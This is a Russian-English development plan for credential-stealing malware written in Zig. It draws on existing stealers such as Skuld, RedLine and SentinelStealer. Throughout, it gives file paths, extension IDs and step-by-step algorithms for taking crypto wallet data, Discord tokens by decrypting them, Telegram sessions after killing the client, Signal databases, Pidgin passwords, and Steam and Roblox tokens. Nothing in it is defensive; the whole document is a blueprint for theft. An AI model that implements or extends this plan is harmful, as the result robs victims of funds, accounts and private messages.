# Phase 4.4–4.6: Wallet, Messenger & Gaming Theft — План реализации

## Источники кода

| Модуль | Источники | Ключевые техники |
|--------|-----------|-----------------|
| **Wallets** | TheBear ExtensionsGrabber.c, Skuld wallets/, Skuld walletsinjection/ | LevelDB copy, ASAR injection |
| **Messengers** | Skuld tokens/, discodes/, discordinjection/; SentinelStealer Messengers/; Phantom/; Antarctida/ | LevelDB token scan, tdata copy, accounts.xml parse |
| **Gaming** | ferrox fun/games/; SentinelStealer Games/; Antarctida Gaming/; Phantom Gaming/ | ssfn+vdf copy, DPAPI token decrypt, .minecraft copy |

## Phase 4.4 — Wallet Theft (`src/wallets/`)

### `wallets.zig` — Orchestrator
```
- Iterate users (C:\Users\*)
- Call wallets_extensions.collect() for each browser profile
- Call wallets_desktop.collect() for each user
- Aggregate results
```

### `wallets_extensions.zig` — 56+ Extension Wallets
**Data source:** `%LOCALAPPDATA%\<Browser>\User Data\<Profile>\Local Extension Settings\<EXTENSION_ID>\`

**56 extension IDs** (объединённый список из TheBear + Skuld, без дубликатов):
MetaMask, MetaMask2/Flask, Binance, Coinbase, Ronin, Trust, Venom, Sui, Martian, TronLink, Petra, Pontem, Fewcha, Math, Coin98, ExodusWeb3, Phantom, Core, TokenPocket, SafePal, Solflare, Kaikas, iWallet, Yoroi, Guarda, Jaxx Liberty, Wombat, Oxygen, MEW CX, Guild, Saturn, Terra Station, Harmony, Ever, KardiaChain, Pali, BoltX, Liquality, XDEFI, Nami, Maiar DeFi, Temple Tezos, XMR.PT, Keplr, Bitapp, Crocobit, Equal, Finnie, Mobox, Nifty, Slope, Sollet, Starcoin, Swash, Ton, XinPay
(56 total)

**Method:** Копировать всю директорию `Local Extension Settings\{id}\` целиком.

### `wallets_desktop.zig` — 10 Desktop Wallets
**Data source:** `%APPDATA%\Roaming\<Wallet>\`

| Wallet | Path | File/Dir |
|--------|------|----------|
| Zcash | `\Zcash\` | Dir |
| Armory | `\Armory\` | Dir |
| Bytecoin | `\bytecoin\` | Dir |
| Jaxx | `\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb\` | Dir |
| Exodus | `\Exodus\exodus.wallet` | File |
| Ethereum | `\Ethereum\keystore\` | Dir |
| Electrum | `\Electrum\wallets\` | Dir |
| AtomicWallet | `\atomic\Local Storage\leveldb\` | Dir |
| Guarda | `\Guarda\Local Storage\leveldb\` | Dir |
| Coinomi | `\Coinomi\Coinomi\wallets\` | Dir |

## Phase 4.5 — Messenger Theft (`src/messengers/`)

### `discord.zig` — Discord Token
**Data source:** `%APPDATA%\<discord>\Local Storage\leveldb\*.ldb`

**Algorithm (из Skuld tokens.go + SentinelStealer Discord.cs):**
```
1. Для каждого Discord клиента (discord, discordcanary, discordptb, discorddevelopment):
   a. Прочитать Local State → master key (DPAPI + AES-GCM)
   b. Сканировать leveldb/*.ldb на паттерн dQw4w9WgXcQ:[base64]
   c. Base64 decode → AES-GCM decrypt → token
   d. Валидация через Discord API v9/users/@me
   e. Получить: username, email, phone, nitro, billing, guilds
2. Для всех Chromium браузеров:
   a. Сканировать leveldb на сырые токены (регулярка)
3. Для всех Gecko браузеров:
   a. Сканировать .sqlite файлы на сырые токены
```

### `telegram.zig` — Telegram Sessions
**Data source:** `%APPDATA%\Telegram Desktop\tdata\`

**Algorithm (из Phantom Telegram.cs + Antarctida Telegram.cs):**
```
1. Найти tdata:
   a. Default: %APPDATA%\Telegram Desktop\tdata
   b. Через процесс: если Telegram запущен, взять path из процесса
   c. Registry: HKEY_CLASSES_ROOT\tg\DefaultIcon
2. Kill Telegram процесс
3. Очистить user_data* папки из tdata (чтобы уменьшить размер)
4. Скопировать: 16-char session dirs, settings*, key_data*, usertag*, configs*, maps*
5. Макс размер файла: 5120-7120 байт
```

### `signal.zig` — Signal Sessions
**Data source:** `%APPDATA%\Signal\`

**Algorithm (из Phantom Signal.cs):**
```
1. Копировать: sql/db.sqlite, config.json, attachments.noindex/
2. Local Storage/, Session Storage/ (если есть)
```

### `pidgin.zig` — Pidgin Accounts
**Data source:** `%APPDATA%\.purple\accounts.xml`

**Algorithm (из Phantom Pidgin.cs + RedLine Pidgin.cs):**
```
1. Парсить accounts.xml через XML (или regex)
2. Для каждого account: Protocol, Username, Password
3. Скопировать chat logs из logs/
```

## Phase 4.6 — Gaming Theft (`src/gaming/`)

### `steam.zig` — Steam
**Data source:** Registry `Software\Valve\Steam` → `SteamPath`

**Algorithm (из SentinelStealer Steam.cs + ferrox gsteam.rs):**
```
1. Прочитать SteamPath из реестра
2. Скопировать ssfn* файлы
3. Скопировать config/*.vdf (loginusers.vdf, config.vdf)
4. Скопировать userdata/ директории
5. Расшифровать Steam token из loginusers.vdf через DPAPI
   (account name как entropy)
6. Перечислить установленные игры из реестра Apps
```

### `uplay.zig` — Uplay/Ubisoft
**Algorithm (из Phantom Uplay.cs + ferrox guplay.rs):**
```
1. Скопировать %LOCALAPPDATA%\Ubisoft Game Launcher\
2. Скопировать %APPDATA%\Ubisoft Game Launcher\
```

### `minecraft.zig` — Minecraft
**Algorithm (из Phantom Minecraft.cs + ferrox gminecraft.rs):**
```
1. Скопировать .minecraft\ (versions, mods, saves, screenshots, launcher accounts)
2. Проверить 30+ лаунчеров: TLauncher, Lunar, Feather, Badlion, PolyMC, Prism, MultiMC...
```

### `battlenet.zig` — Battle.net
**Algorithm (из Phantom BattleNet.cs + ferrox gbattlenet.rs):**
```
1. Скопировать *.db, *.config из %APPDATA%\Battle.net\
2. Скопировать %LOCALAPPDATA%\Blizzard Entertainment\
```

### `roblox.zig` — Roblox
**Algorithm (из SentinelStealer Roblox.cs + Antarctida Roblox.cs):**
```
1. Прочитать robloxcookies.dat → DPAPI decrypt → .ROBLOSECURITY token
2. Прочитать appStorage.json → userId, username, displayName
```

## Файловая структура

```
src/
├── wallets/
│   ├── wallets.zig              # Orchestrator (NEW)
│   ├── wallet_extensions.zig    # 56 extension wallets (NEW)
│   └── wallet_desktop.zig       # 10 desktop wallets (NEW)
├── messengers/
│   ├── messengers.zig           # Orchestrator (NEW)
│   ├── discord.zig              # Discord token (NEW)
│   ├── telegram.zig             # Telegram tdata (NEW)
│   ├── signal.zig               # Signal sessions (NEW)
│   └── pidgin.zig               # Pidgin accounts (NEW)
└── gaming/
    ├── gaming.zig               # Orchestrator (NEW)
    ├── steam.zig                # Steam (NEW)
    ├── uplay.zig                # Uplay (NEW)
    ├── minecraft.zig            # Minecraft (NEW)
    ├── battlenet.zig            # Battle.net (NEW)
    └── roblox.zig               # Roblox (NEW)
```

**Total новых файлов:** 15
**Оценка строк:** ~2000
